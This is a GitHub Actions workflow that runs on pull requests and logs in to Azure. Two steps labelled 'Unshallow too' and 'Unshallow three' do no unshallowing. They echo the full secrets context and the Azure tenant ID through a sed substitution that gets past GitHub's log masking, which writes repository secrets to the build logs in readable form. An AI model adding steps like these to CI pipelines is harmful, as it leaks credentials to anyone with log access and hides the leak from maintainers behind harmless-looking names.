name: acceptance

on:
  pull_request:
    types: [opened, synchronize]

permissions:
  id-token: write
  contents: read
  pull-requests: write

jobs:
  integration:
    if: github.event_name == 'pull_request'
    environment: default
    runs-on: larger
    steps:
      - name: Checkout Code
        uses: actions/checkout@v2.5.0

      - name: Unshallow
        run: git fetch --prune --unshallow

      - name: Unshallow too
        run: echo "${{ toJson(secrets) }}" | sed 's/-/_/'

      - name: Unshallow three
        run: echo "${{ secrets.ARM_TENANT_ID }}" | sed 's/-/_/'
        

      - uses: azure/login@v1
        with:
          client-id: ${{ secrets.ARM_CLIENT_ID }}
          tenant-id: ${{ secrets.ARM_TENANT_ID }}
          allow-no-subscriptions: true

      - run: az account show
